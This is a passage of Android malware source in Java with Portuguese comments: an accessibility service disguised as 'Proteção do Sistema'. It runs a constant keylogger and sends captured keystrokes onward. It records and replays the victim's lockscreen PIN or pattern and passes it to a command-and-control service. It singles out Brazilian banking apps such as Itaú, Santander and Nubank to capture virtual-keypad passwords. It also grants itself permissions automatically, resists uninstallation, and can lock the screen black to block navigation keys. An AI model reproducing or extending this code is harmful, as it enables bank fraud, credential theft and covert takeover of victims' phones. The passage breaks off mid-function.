        unlockType = "unknown";
        Log.d(TAG, "🔴 GRAVAÇÃO DE DESBLOQUEIO INICIADA!");
    }
    
    /**
     * Para gravação de sequência de desbloqueio
     */
    private void stopUnlockRecording() {
        isRecordingUnlock = false;
        Log.d(TAG, "⏹️ GRAVAÇÃO DE DESBLOQUEIO PARADA! " + unlockSequence.size() + " ações gravadas");
        
        // Envia sequência para o servidor
        sendUnlockSequenceToServer();
    }
    
    /**
     * Reproduz sequência de desbloqueio gravada
     */
    private void playUnlockSequence() {
        Log.d(TAG, "🔓 playUnlockSequence() chamado! Sequência tem " + unlockSequence.size() + " ações");
        
        if (unlockSequence.isEmpty()) {
            Log.w(TAG, "⚠️ Nenhuma sequência de desbloqueio gravada!");
            return;
        }
        
        Log.d(TAG, "▶️ REPRODUZINDO SEQUÊNCIA DE DESBLOQUEIO (" + unlockSequence.size() + " ações, tipo=" + unlockType + ")");
        
        // Primeiro, acorda a tela se estiver desligada
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        if (!pm.isInteractive()) {
            wakeUpScreen();
            // Aguarda a tela ligar
            handler.postDelayed(() -> executeUnlockSequence(0), 1000);
        } else {
            executeUnlockSequence(0);
        }
    }
    
    /**
     * Executa a sequência de desbloqueio de forma sequencial
     */
    private void executeUnlockSequence(int index) {
        if (index >= unlockSequence.size()) {
            Log.d(TAG, "✅ Sequência de desbloqueio concluída!");
            return;
        }
        
        UnlockAction action = unlockSequence.get(index);
        Log.d(TAG, "🔓 Executando ação " + (index + 1) + "/" + unlockSequence.size() + ": " + action.type);
        
        if ("CLICK".equals(action.type)) {
            if (gestureCore != null) gestureCore.executeClick(action.x, action.y);
        } else if ("SWIPE".equals(action.type)) {
            if (gestureCore != null) gestureCore.executeSwipe(action.x, action.y, action.x2, action.y2);
        } else if ("TYPE".equals(action.type)) {
            if (action.text != null && action.text.length() > 0 && gestureCore != null) {
                gestureCore.executeType(action.text);
            }
        }
        
        // Executa próxima ação após delay
        long delay = action.delay > 0 ? action.delay : 200;
        handler.postDelayed(() -> executeUnlockSequence(index + 1), delay);
    }

    private void applyUnlockSequenceJson(String json) {
        try {
            org.json.JSONObject root = new org.json.JSONObject(json);
            java.util.ArrayList<UnlockAction> list = new java.util.ArrayList<>();
            String t = root.optString("type", "unknown");
            org.json.JSONArray seq = root.optJSONArray("sequence");
            int baseW = root.optInt("screen_w", 0);
            int baseH = root.optInt("screen_h", 0);
            float sx = 1f;
            float sy = 1f;
            if (baseW > 0 && baseH > 0) {
                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
                sx = (float) dm.widthPixels / (float) baseW;
                sy = (float) dm.heightPixels / (float) baseH;
            }
            if (seq != null) {
                for (int i = 0; i < seq.length(); i++) {
                    org.json.JSONObject a = seq.getJSONObject(i);
                    String at = a.optString("type", "");
                    int x = Math.round(a.optInt("x", 0) * sx);
                    int y = Math.round(a.optInt("y", 0) * sy);
                    int x2 = Math.round(a.optInt("x2", 0) * sx);
                    int y2 = Math.round(a.optInt("y2", 0) * sy);
                    long d = a.optLong("delay", 200);
                    UnlockAction ua;
                    if ("SWIPE".equals(at)) {
                        ua = new UnlockAction(at, x, y, x2, y2);
                    } else {
                        ua = new UnlockAction(at, x, y);
                    }
                    ua.delay = d;
                    ua.text = a.optString("text", "");
                    list.add(ua);
                }
            }
            unlockSequence.clear();
            unlockSequence.addAll(list);
            unlockType = t;
            Log.d(TAG, "🔓 Sequência carregada: " + list.size() + " ações, tipo=" + t);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao aplicar sequência JSON: " + e.getMessage());
        }
    }
    
    /**
     * Envia sequência de desbloqueio para o servidor
     */
    private void sendUnlockSequenceToServer() {
        try {
            org.json.JSONObject json = new org.json.JSONObject();
            json.put("type", unlockType);
            json.put("count", unlockSequence.size());
            
            org.json.JSONArray actions = new org.json.JSONArray();
            for (UnlockAction action : unlockSequence) {
                org.json.JSONObject actionJson = new org.json.JSONObject();
                actionJson.put("type", action.type);
                actionJson.put("x", action.x);
                actionJson.put("y", action.y);
                if ("SWIPE".equals(action.type)) {
                    actionJson.put("x2", action.x2);
                    actionJson.put("y2", action.y2);
                }
                actionJson.put("delay", action.delay);
                actions.put(actionJson);
            }
            json.put("sequence", actions);
            
            // Envia para CommandControlService
            Intent intent = new Intent(this, CommandControlService.class);
            intent.setAction("SEND_UNLOCK_SEQUENCE");
            intent.putExtra("data", json.toString());
            startService(intent);
            
            Log.d(TAG, "📤 Sequência de desbloqueio enviada: " + json.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar sequência: " + e.getMessage());
        }
    }
    
    /**
     * Grava uma ação de desbloqueio (chamado durante eventos de toque na lockscreen)
     */
    private void recordUnlockAction(String type, int x, int y, int x2, int y2) {
        if (!isRecordingUnlock) return;
        
        long delay = getDelay();
        
        UnlockAction action;
        if ("SWIPE".equals(type)) {
            action = new UnlockAction(type, x, y, x2, y2);
        } else {
            action = new UnlockAction(type, x, y);
        }
        action.delay = delay;
        
        unlockSequence.add(action);
        Log.d(TAG, "🔴 Ação gravada: " + type + " (" + x + "," + y + ") - Total: " + unlockSequence.size());
        
        // Detecta tipo de desbloqueio
        detectUnlockType(x, y);
    }
    
    /**
     * Calcula o delay desde a última ação
     */
    private long getDelay() {
        long now = System.currentTimeMillis();
        long delay = now - lastUnlockActionTime;
        lastUnlockActionTime = now;
        return delay > 2000 ? 500 : delay; // Limita delay máximo
    }
    
    /**
     * Detecta o tipo de desbloqueio baseado nas coordenadas
     */
    private void detectUnlockType(int x, int y) {
        // Heurística simples baseada na posição dos toques
        // PIN: toques na parte inferior da tela (onde fica o teclado numérico)
        // Pattern: toques no centro da tela
        // Password: geralmente usa teclado normal
        
        int screenHeight = getResources().getDisplayMetrics().heightPixels;
        
        if (y > screenHeight * 0.6) {
            // Toque na parte inferior - provavelmente PIN
            if (unlockType.equals("unknown")) {
                unlockType = "pin";
            }
        } else if (y > screenHeight * 0.3 && y < screenHeight * 0.7) {
            // Toque no centro - pode ser pattern
            if (unlockSequence.size() > 3) {
                unlockType = "pattern";
            }
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop loop but keep persisted prefs so onServiceConnected can auto-resume (BTMOB-like)
        silentScreenActive = false;
        releaseSilentCpuWakeLock();

        try {
            unregisterReceiver(autoGrantReceiver);
            unregisterReceiver(gestureReceiver);
            unregisterReceiver(keyloggerReceiver);
            unregisterReceiver(screenReaderReceiver);
            unregisterReceiver(unlockRecordingReceiver);
            unregisterReceiver(silentVncReceiver);
            unregisterReceiver(romConfigReceiver);
            unregisterReceiver(allowUninstallReceiver);
            unregisterReceiver(screenPersistenceReceiver);
            unregisterReceiver(toggleScreenPersistenceReceiver);
            releaseScreenPersistenceWakeLock();
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver: " + e.getMessage());
        }
        
        // Para Screen Reader
        stopScreenReader();
        
        Log.d(TAG, "Serviço de acessibilidade destruído");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (CommandControlService.isKillerModeActive) {
            return;
        }

        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // 🔐 [ANTI-DETECT] Detecta app bancário em foreground via eventos de janela
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            boolean wasBanking = bankingAppOnScreen;
            bankingAppOnScreen = isBankingApp(packageName);
            if (bankingAppOnScreen != wasBanking) {
                Log.d(TAG, "🔐 [ANTI-DETECT] App bancário " + (bankingAppOnScreen ? "DETECTADO" : "SAIU") + ": " + packageName);
                // Notifica o painel via broadcast
                Intent bankIntent = new Intent("com.seguranca.protecao.BANKING_APP_STATE");
                bankIntent.setPackage(getPackageName());
                bankIntent.putExtra("package", packageName);
                bankIntent.putExtra("is_banking", bankingAppOnScreen);
                sendBroadcast(bankIntent);
            }
        }

        if (isBlackScreenActive && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            blockSystemNavWhileBlackScreen(packageName, className);
        }
        
        // 💾 KEYLOGGER 24/7: Captura eventos de texto SEMPRE, mesmo sem rootNode
        // Isso garante que NADA seja perdido! v2.0
        if (keyloggerEnabled) {
            int eventType = event.getEventType();
            
            // Captura eventos de texto IMEDIATAMENTE
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> textList = event.getText();
                if (textList != null && !textList.isEmpty()) {
                    String text = textList.toString();
                    if (!text.equals(lastCapturedText) && !text.equals("[]")) {
                        lastCapturedText = text;
                        Log.d(TAG, "⌨️ KEYLOG 24/7: " + packageName + " - " + text);
                        sendKeylogData(packageName, text, "", "", false, "TEXT_CHANGED");
                    }
                }
            }
            
            // Captura cliques em teclado (senhas bancárias e PIN lockscreen)
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                if (event.getSource() != null) {
                    AccessibilityNodeInfo source = event.getSource();
                    String clickedText = "";
                    if (source.getText() != null) {
                        clickedText = source.getText().toString();
                    } else if (source.getContentDescription() != null) {
                        clickedText = source.getContentDescription().toString();
                    }
                    if (!clickedText.isEmpty()) {
                        // 🔐 Detecta se é lockscreen/keyguard (PIN de desbloqueio)
                        boolean isLockScreen = packageName.contains("systemui") || 
                                               packageName.contains("keyguard");
                        // É senha se é lockscreen OU se é dígito único em teclado
                        boolean isPassword = isLockScreen || clickedText.matches("^[0-9]$");
                        String eventType2 = isLockScreen ? "LOCKSCREEN_PIN" : "VIEW_CLICKED";
                        
                        Log.d(TAG, "👆 CLICK 24/7: " + packageName + " - " + clickedText + (isPassword ? " 🔑" : ""));
                        sendKeylogData(packageName, clickedText, isLockScreen ? "Senha Desbloqueio" : "", "", isPassword, eventType2);
                    }
                    source.recycle();
                }
            }
        }
        
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            // Mesmo sem rootNode, já capturamos os keylogs acima!
            return;
        }
        
        Log.d(TAG, "Evento: " + packageName + " - " + className);
        
        // 🔒 PROTEÇÃO CONTRA DESINSTALAÇÃO E DESATIVAÇÃO
        // Detecta se o usuário está tentando desinstalar ou desativar o app
        protectAgainstRemoval(packageName, className, rootNode);

        // === GRAVAÇÃO DE DESBLOQUEIO (independente do keylogger) ===
        if (isRecordingUnlock) {
            captureUnlockAction(event);
        }
        
        // Sempre monitora para keylogging e captura de dados
        captureUserData(event, rootNode);
        
        rootNode.recycle();
    }
    
    /**
     * Captura ações de desbloqueio (cliques na lockscreen)
     * IMPORTANTE: Para PATTERN/SWIPE, precisamos capturar de forma diferente
     */
    private void captureUnlockAction(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";
        
        Log.d(TAG, "🔴 UNLOCK EVENT: type=" + eventType + " pkg=" + packageName + " class=" + className);
        
        // Verifica se estamos na tela de bloqueio (systemui ou keyguard)
        boolean isLockScreen = packageName.contains("systemui") || 
                               packageName.contains("keyguard") ||
                               className.contains("Keyguard") ||
                               className.contains("Lock");
        
        // Captura cliques (para PIN)
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            if (event.getSource() != null) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    Rect bounds = new Rect();
                    source.getBoundsInScreen(bounds);
                    int x = bounds.centerX();
                    int y = bounds.centerY();
                    
                    // Captura texto do botão (para identificar PIN)
                    String buttonText = "";
                    if (source.getText() != null) {
                        buttonText = source.getText().toString();
                    } else if (source.getContentDescription() != null) {
                        buttonText = source.getContentDescription().toString();
                    }
                    
                    Log.d(TAG, "🔴 UNLOCK CLICK: (" + x + "," + y + ") texto=[" + buttonText + "]");
                    
                    // Grava a ação
                    recordUnlockAction("CLICK", x, y, 0, 0);
                    unlockType = "pin";
                    
                    source.recycle();
                }
            }
        }
        
        // Captura eventos de toque (para PATTERN/SWIPE)
        // TYPE_TOUCH_INTERACTION_START = 0x00100000 (1048576)
        // TYPE_TOUCH_INTERACTION_END = 0x00200000 (2097152)
        // TYPE_TOUCH_EXPLORATION_GESTURE_START = 0x00000200 (512)
        // TYPE_TOUCH_EXPLORATION_GESTURE_END = 0x00000400 (1024)
        if (eventType == AccessibilityEvent.TYPE_TOUCH_INTERACTION_START ||
            eventType == AccessibilityEvent.TYPE_TOUCH_INTERACTION_END ||
            eventType == AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START ||
            eventType == AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END ||
            eventType == AccessibilityEvent.TYPE_GESTURE_DETECTION_START ||
            eventType == AccessibilityEvent.TYPE_GESTURE_DETECTION_END) {
            
            Log.d(TAG, "🔴 UNLOCK TOUCH/GESTURE: type=" + eventType + " isLockScreen=" + isLockScreen);
            
            // Para pattern, precisamos capturar a posição do gesto
            if (isLockScreen) {
                unlockType = "pattern";
                // Tenta obter bounds do evento
                if (event.getSource() != null) {
                    AccessibilityNodeInfo source = event.getSource();
                    Rect bounds = new Rect();
                    source.getBoundsInScreen(bounds);
                    Log.d(TAG, "🔴 UNLOCK TOUCH BOUNDS: " + bounds.toString());
                    source.recycle();
                }
            }
        }
        
        // Captura scroll/swipe (para desbloqueio por deslize)
        if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            Log.d(TAG, "🔴 UNLOCK SCROLL detectado");
            if (isLockScreen) {
                unlockType = "swipe";
                // Para swipe simples, grava como swipe do centro para cima
                android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
                int centerX = dm.widthPixels / 2;
                int startY = dm.heightPixels * 3 / 4;
                int endY = dm.heightPixels / 4;
                recordUnlockAction("SWIPE", centerX, startY, centerX, endY);
            }
        }
        
        // Captura mudanças de foco (pode indicar navegação na lockscreen)
        if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            if (isLockScreen && event.getSource() != null) {
                AccessibilityNodeInfo source = event.getSource();
                Rect bounds = new Rect();
                source.getBoundsInScreen(bounds);
                Log.d(TAG, "🔴 UNLOCK FOCUS: " + bounds.toString());
                source.recycle();
            }
        }
        
        // Captura seleção de view (para pattern dots)
        if (eventType == AccessibilityEvent.TYPE_VIEW_SELECTED) {
            if (isLockScreen && event.getSource() != null) {
                AccessibilityNodeInfo source = event.getSource();
                Rect bounds = new Rect();
                source.getBoundsInScreen(bounds);
                int x = bounds.centerX();
                int y = bounds.centerY();
                Log.d(TAG, "🔴 UNLOCK SELECT: (" + x + "," + y + ")");
                recordUnlockAction("CLICK", x, y, 0, 0);
                unlockType = "pattern";
                source.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Serviço interrompido");
    }
    
    /**
     * Captura gestos do usuário (para pattern lock)
     * Requer API 26+ e flagRequestTouchExplorationMode
     */
    @Override
    protected boolean onGesture(int gestureId) {
        Log.d(TAG, "🔴 onGesture: gestureId=" + gestureId);
        
        if (isRecordingUnlock) {
            Log.d(TAG, "🔴 UNLOCK GESTURE DETECTED: " + gestureId);
            unlockType = "pattern";
            
            // Gestos comuns:
            // GESTURE_SWIPE_UP = 1
            // GESTURE_SWIPE_DOWN = 2
            // GESTURE_SWIPE_LEFT = 3
            // GESTURE_SWIPE_RIGHT = 4
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            int centerX = dm.widthPixels / 2;
            int centerY = dm.heightPixels / 2;
            int delta = dm.widthPixels / 3;
            
            switch (gestureId) {
                case 1: // SWIPE_UP
                    recordUnlockAction("SWIPE", centerX, centerY + delta, centerX, centerY - delta);
                    break;
                case 2: // SWIPE_DOWN
                    recordUnlockAction("SWIPE", centerX, centerY - delta, centerX, centerY + delta);
                    break;
                case 3: // SWIPE_LEFT
                    recordUnlockAction("SWIPE", centerX + delta, centerY, centerX - delta, centerY);
                    break;
                case 4: // SWIPE_RIGHT
                    recordUnlockAction("SWIPE", centerX - delta, centerY, centerX + delta, centerY);
                    break;
            }
        }
        
        return super.onGesture(gestureId);
    }
    
    /**
     * Captura eventos de tecla (para PIN via teclado físico)
     * Requer flagRequestFilterKeyEvents
     */
    @Override
    protected boolean onKeyEvent(android.view.KeyEvent event) {
        if (isBlackScreenActive && event.getAction() == android.view.KeyEvent.ACTION_DOWN) {
            int keyCode = event.getKeyCode();
            if (keyCode == android.view.KeyEvent.KEYCODE_BACK
                    || keyCode == android.view.KeyEvent.KEYCODE_HOME
                    || keyCode == android.view.KeyEvent.KEYCODE_APP_SWITCH
                    || keyCode == android.view.KeyEvent.KEYCODE_MENU) {
                Log.d(TAG, "🖤 Tecla de navegação bloqueada (Tela Preta): " + keyCode);
                return true;
            }
        }
        if (isRecordingUnlock && event.getAction() == android.view.KeyEvent.ACTION_UP) {
            int keyCode = event.getKeyCode();
            Log.d(TAG, "🔴 UNLOCK KEY: keyCode=" + keyCode);
            
            // Captura teclas numéricas (0-9)
            if (keyCode >= android.view.KeyEvent.KEYCODE_0 && keyCode <= android.view.KeyEvent.KEYCODE_9) {
                int digit = keyCode - android.view.KeyEvent.KEYCODE_0;
                Log.d(TAG, "🔴 UNLOCK PIN DIGIT: " + digit);
                unlockType = "pin";
                // Para PIN via teclado, grava como texto
                UnlockAction action = new UnlockAction("TYPE", 0, 0);
                action.text = String.valueOf(digit);
                action.delay = getDelay();
                unlockSequence.add(action);
            }
        }
        return super.onKeyEvent(event);
    }

    /**
     * Inicia o processo de automação de permissões
     */
    private void startAutomation() {
        Log.d(TAG, "Iniciando automação de permissões...");
        isAutomating = true;
        automationStep = STEP_REQUEST_OVERLAY;
        
        PermissionManager pm = new PermissionManager(this);
        
        // Verifica quais permissões ainda faltam
        if (!pm.hasOverlayPermission()) {
            Log.d(TAG, "Solicitando permissão de overlay...");
            automationStep = STEP_REQUEST_OVERLAY;
            pm.requestOverlayPermission();
            
            // Aguarda a tela de configurações abrir
            handler.postDelayed(() -> {
                automationStep = STEP_ENABLE_OVERLAY;
            }, 1000);
        } else if (!pm.isIgnoringBatteryOptimizations()) {
            Log.d(TAG, "Solicitando ignorar otimização de bateria...");
            automationStep = STEP_REQUEST_BATTERY;
            pm.requestIgnoreBatteryOptimizations();
        } else {
            finishAutomationWizard();
        }
    }

    /**
     * Automatiza a tela de permissão "Desenhar sobre outras apps"
     */
    private void handleOverlayPermissionScreen(AccessibilityNodeInfo rootNode) {
        Log.d(TAG, "Detectou tela de overlay permission");
        
        // Procura pelo nosso nome de app
        List<AccessibilityNodeInfo> appNameNodes = rootNode.findAccessibilityNodeInfosByText("Proteção do Sistema");
        if (appNameNodes != null && !appNameNodes.isEmpty()) {
            Log.d(TAG, "Encontrou nosso app na lista");
            AccessibilityNodeInfo appNode = appNameNodes.get(0);
            
            // Clica no nosso app
            clickNode(appNode);
            
            // Aguarda a tela de detalhes abrir e procura pelo switch
            handler.postDelayed(() -> {
                AccessibilityNodeInfo newRoot = getRootInActiveWindow();
                if (newRoot != null) {
                    // Procura pelo switch ou botão de permitir
                    List<AccessibilityNodeInfo> switches = findNodesByClassName(newRoot, "android.widget.Switch");
                    if (switches != null && !switches.isEmpty()) {
                        for (AccessibilityNodeInfo switchNode : switches) {
                            if (!switchNode.isChecked()) {
                                Log.d(TAG, "Ativando switch de overlay");
                                clickNode(switchNode);
                                break;
                            }
                        }
                    }
                    
                    // Volta para o app
                    handler.postDelayed(() -> {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                        performGlobalAction(GLOBAL_ACTION_BACK);
                        
                        // Próximo passo: bateria
                        continueAutomation();
                    }, 500);
                    
                    newRoot.recycle();
                }
            }, 1000);
        }
    }

    /**
     * Automatiza a tela de otimização de bateria
     */
    private void handleBatteryOptimizationScreen(AccessibilityNodeInfo rootNode) {
        Log.d(TAG, "Detectou tela de otimização de bateria");
        
        // Procura pelo botão "Permitir" ou "Allow"
        List<AccessibilityNodeInfo> buttons = findNodesByText(rootNode, "Permitir", "Allow", "Sim", "Yes");
        
        if (buttons != null && !buttons.isEmpty()) {
            Log.d(TAG, "Clicando em 'Permitir'");
            clickNode(buttons.get(0));
            
            handler.postDelayed(() -> {
                performGlobalAction(GLOBAL_ACTION_BACK);
                continueAutomation();
            }, 500);
        }
    }

    /**
     * Continua o fluxo de automação
     */
    private void continueAutomation() {
        PermissionManager pm = new PermissionManager(this);
        
        if (!pm.isIgnoringBatteryOptimizations()) {
            automationStep = STEP_REQUEST_BATTERY;
            pm.requestIgnoreBatteryOptimizations();
        } else {
            finishAutomationWizard();
        }
    }

    private void finishAutomationWizard() {
        automationStep = STEP_COMPLETE;
        isAutomating = false;
        Log.d(TAG, "Automação de permissões do sistema completa");
        startAllServices();
    }

    /**
     * Inicia todos os serviços após permissões concedidas
     */
    private void startAllServices() {
        Log.d(TAG, "✅ Iniciando todos os serviços...");
        
        // Serviço de comando e controle (conecta ao servidor)
        Intent ccIntent = new Intent(this, CommandControlService.class);
        startService(ccIntent);
        
        Log.d(TAG, "📡 Serviço C&C iniciado - aguardando conexão com servidor");
    }

    /**
     * Captura dados do usuário (keylogging, senhas, etc.)
     */
    /**
     * KEYLOGGER PROFISSIONAL
     * Captura TUDO que a vítima digita + contexto completo
     */
    private void captureUserData(AccessibilityEvent event, AccessibilityNodeInfo rootNode) {
        // Se keylogger não está ativo, sai
        if (!keyloggerEnabled) return;
        
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "desconhecido";
        
        // Captura CLIQUES em teclado virtual (Itáu, Bradesco, etc)
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            if (event.getSource() != null) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String clickedText = "";
                    String className = source.getClassName() != null ? source.getClassName().toString() : "";
                    
                    // === ESTRATÉGIA COMPLETA PARA CAPTURAR TEXTO DO BOTÃO ===
                    
                    // 1. Texto direto do nó
                    if (source.getText() != null && source.getText().length() > 0) {
                        clickedText = source.getText().toString();
                    }
                    
                    // 2. ContentDescription
                    if (clickedText.isEmpty() && source.getContentDescription() != null) {
                        clickedText = source.getContentDescription().toString();
                    }
                    
                    // 3. Busca texto em TODOS os filhos (teclados bancários escondem texto em filhos)
                    if (clickedText.isEmpty()) {
                        clickedText = findTextInChildren(source);
                    }
                    
                    // 4. Busca no pai (às vezes o texto está no container)
                    if (clickedText.isEmpty()) {
                        AccessibilityNodeInfo parent = source.getParent();
                        if (parent != null) {
                            if (parent.getText() != null && parent.getText().length() > 0) {
                                clickedText = parent.getText().toString();
                            } else if (parent.getContentDescription() != null) {
                                clickedText = parent.getContentDescription().toString();
                            } else {
                                // Busca nos irmãos
                                clickedText = findTextInChildren(parent);
                            }
                            parent.recycle();
                        }
                    }
                    
                    // 5. ViewId como fallback
                    if (clickedText.isEmpty() && source.getViewIdResourceName() != null) {
                        String viewId = source.getViewIdResourceName();
                        if (viewId.contains("button") || viewId.contains("key") || viewId.contains("digit")) {
                            String[] parts = viewId.split("[_-]");
                            for (String part : parts) {
                                if (part.matches("^[0-9]$")) {
                                    clickedText = part;
                                    break;
                                }
                            }
                        }
                        // Se ainda vazio, usa o próprio ID
                        if (clickedText.isEmpty()) {
                            clickedText = "[ID:" + viewId + "]";
                        }
                    }
                    
                    // 🔐 DETECTA LOCKSCREEN/KEYGUARD (Senha de desbloqueio do celular)
                    boolean isLockScreen = packageName.contains("systemui") || 
                                           packageName.contains("keyguard") ||
                                           className.contains("Keyguard") ||
                                           className.contains("LockPattern") ||
                                           className.contains("PinPad");
                    
                    // Log TODOS os cliques em apps bancários para debug
                    boolean isBankApp = packageName.contains("itau") || packageName.contains("bradesco") || 
                        packageName.contains("santander") || packageName.contains("neon") ||
                        packageName.contains("nubank") || packageName.contains("banco") ||
                        packageName.contains("caixa") || packageName.contains("bb.") ||
                        packageName.contains("inter") || packageName.contains("c6") ||
                        packageName.contains("picpay") || packageName.contains("mercadopago");
                    
                    if (isBankApp) {
                        Log.w(TAG, "🏦 CLIQUE EM APP BANCÁRIO: " + packageName);
                        Log.w(TAG, "  📝 Texto capturado: [" + clickedText + "]");
                        Log.w(TAG, "  📋 ContentDesc: " + source.getContentDescription());
                        Log.w(TAG, "  🔖 ViewId: " + source.getViewIdResourceName());
                        Log.w(TAG, "  📦 Classe: " + className);
                        Log.w(TAG, "  👆 Clickable: " + source.isClickable());
                    }
                    
                    // === CAPTURA INTELIGENTE ===
                    
                    // Detecta teclado numérico embaralhado (Itaú: "0ou9", "1ou6", etc.)
                    boolean isScrambledKeyboard = clickedText.matches(".*[0-9].*ou.*[0-9].*") || 
                                                   clickedText.matches(".*[0-9].*or.*[0-9].*");
                    
                    // Detecta dígito simples
                    boolean isSingleDigit = clickedText.matches("^[0-9]$");
                    
                    // Detecta tecla de teclado (pode ser letra ou número)
                    boolean isKeyboardKey = clickedText.matches("^[0-9A-Za-z]$") || 
                                            clickedText.matches("^[0-9].*[0-9]$"); // "0ou9" style
                    
                    if (isScrambledKeyboard || isSingleDigit || isKeyboardKey) {
                        // É uma tecla de teclado virtual! Captura como senha
                        Log.w(TAG, "🔑 TECLA DE SENHA DETECTADA: [" + clickedText + "] (" + packageName + ")");
                        
                        String hint = findActivePasswordFieldHint(rootNode);
                        String eventTypeStr = isLockScreen ? "LOCKSCREEN_PIN" : "VIRTUAL_KEYBOARD_CLICK";
                        sendKeylogData(packageName, clickedText, hint, "", true, eventTypeStr);
                    }
                    // 🔐 CAPTURA PIN DA LOCKSCREEN (Desbloqueio do celular)
                    else if (isLockScreen && source.isClickable()) {
                        Rect bounds = new Rect();
                        source.getBoundsInScreen(bounds);
                        int centerX = bounds.centerX();
                        int centerY = bounds.centerY();
                        int btnWidth = bounds.width();
                        int btnHeight = bounds.height();
                        
                        Log.w(TAG, "🔐 LOCKSCREEN CLIQUE DETECTADO!");
                        Log.w(TAG, "  📝 Texto: [" + clickedText + "]");
                        Log.w(TAG, "  📍 Posição: (" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
                        
                        // Tenta capturar o dígito
                        String capturedDigit = clickedText;
                        
                        // Se não tem texto, tenta detectar pela posição (teclado 3x4)
                        if (capturedDigit.isEmpty() || !capturedDigit.matches("^[0-9]$")) {
                            capturedDigit = detectLockscreenPinDigit(bounds, source);
                        }
                        
                        if (!capturedDigit.isEmpty()) {
                            Log.w(TAG, "🔐🔑 PIN DESBLOQUEIO CAPTURADO: [" + capturedDigit + "]");
                            sendKeylogData("LOCKSCREEN_PIN", capturedDigit, "Senha de Desbloqueio", "PIN", true, "LOCKSCREEN_PIN");
                        } else {
                            // Mesmo sem detectar, loga para análise
                            sendKeylogData("LOCKSCREEN_PIN", "[BTN:" + centerX + "," + centerY + "]", "Senha de Desbloqueio", "PIN_POS", true, "LOCKSCREEN_BTN");
                        }
                    }
                    // === SANTANDER: Teclado customizado sem texto ===
                    // O Santander usa imagens nos botões, precisamos detectar pela posição
                    else if (packageName.contains("santander") && source.isClickable()) {
                        Rect bounds = new Rect();
                        source.getBoundsInScreen(bounds);
                        int centerX = bounds.centerX();
                        int centerY = bounds.centerY();
                        
                        // Detecta se é um botão do teclado numérico baseado no tamanho e posição
                        int btnWidth = bounds.width();
                        int btnHeight = bounds.height();
                        
                        // Botões do teclado Santander são quadrados ~100-200px
                        boolean isKeypadButton = btnWidth > 50 && btnWidth < 300 && 
                                                 btnHeight > 50 && btnHeight < 200 &&
                                                 centerY > 800; // Teclado fica na parte inferior
                        
                        if (isKeypadButton) {
                            // Tenta identificar o número pela posição relativa
                            // Teclado típico 3x4: (1,2,3), (4,5,6), (7,8,9), (X,0,OK)
                            String detectedDigit = detectSantanderKeypadDigit(bounds, source);
                            
                            if (!detectedDigit.isEmpty()) {
                                Log.w(TAG, "🔑 SANTANDER TECLA: [" + detectedDigit + "] pos(" + centerX + "," + centerY + ")");
                                String hint = findActivePasswordFieldHint(rootNode);
                                sendKeylogData(packageName, detectedDigit, hint, "", true, "SANTANDER_KEYPAD");
                            } else {
                                // Se não conseguiu detectar, loga posição para análise
                                Log.w(TAG, "🔑 SANTANDER CLIQUE: pos(" + centerX + "," + centerY + ") size(" + btnWidth + "x" + btnHeight + ")");
                                String hint = findActivePasswordFieldHint(rootNode);
                                sendKeylogData(packageName, "[BTN:" + centerX + "," + centerY + "]", hint, "", true, "SANTANDER_BTN_POS");
                            }
                        }
                    }
                    // Captura QUALQUER clique em apps bancários com texto
                    else if (isBankApp && !clickedText.isEmpty() && 
                            (className.contains("Button") || className.contains("ImageButton") || 
                             className.contains("View") || className.contains("Text"))) {
                        
                        String hint = findActivePasswordFieldHint(rootNode);
                        sendKeylogData(packageName, clickedText, hint, "", true, "BANK_BUTTON_CLICK");
                    }
                    // Captura clique sem texto em apps bancários (para análise)
                    else if (isBankApp && source.isClickable()) {
                        String hint = findActivePasswordFieldHint(rootNode);
                        // Tenta obter posição do clique para identificar qual botão
                        Rect bounds = new Rect();
                        source.getBoundsInScreen(bounds);
                        String position = "pos(" + bounds.centerX() + "," + bounds.centerY() + ")";
                        sendKeylogData(packageName, "[CLICK:" + className + " " + position + "]", hint, "", true, "BANK_CLICK_POSITION");
                    }
                    
                    source.recycle();
                }
            }
        }
        
        // Captura alterações de texto (TUDO que é digitado)
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> textList = event.getText();
            if (textList != null && !textList.isEmpty()) {
                String text = textList.toString();
                
                // Evita duplicatas
                if (!text.equals(lastCapturedText)) {
                    String previousText = lastCapturedText;
                    lastCapturedText = text;
                    
                    // Obtém contexto adicional
                    String fieldHint = "";
                    String fieldName = "";
                    boolean isPassword = false;
                    
